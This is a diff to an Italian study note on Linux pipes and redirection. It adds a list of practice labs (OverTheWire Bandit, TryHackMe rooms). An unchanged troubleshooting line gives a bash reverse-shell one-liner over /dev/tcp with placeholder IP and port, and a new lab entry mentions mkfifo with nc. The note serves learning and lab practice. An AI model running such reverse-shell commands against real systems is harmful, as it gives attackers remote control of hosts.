@@ -3,7 +3,7 @@ tipo: concetto
 tag: [linux]
 fase: 1
 fonti: 4
-aggiornato: 2026-06-26
+aggiornato: 2026-06-28
 stato: maturo
 aliases: ["Pipe e Redirezione", "Redirezione e Pipeline"]
 ---
@@ -306,6 +306,12 @@ I comandi che leggono stdin, trasformano e scrivono stdout si chiamano **filtri*
 5. **`/dev/tcp` non funziona** → Stai girando sotto `sh`/`dash`, non bash. Verifica con `echo $0`. Forza: `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'`.
 
 ---
+
+## Lab
+
+- **OverTheWire — Bandit** (livelli 5-20): molte sfide si risolvono concatenando filtri in pipeline e redirigendo I/O.
+- **TryHackMe — Linux Fundamentals Part 2 / Bash Scripting**: pratica pipe, redirezione e here-doc.
+- **TryHackMe — Network Services** (reverse shell): esercita `mkfifo` + `nc` e `bash -i >& /dev/tcp/...`.
 
 ## Domande da esame / colloquio
 
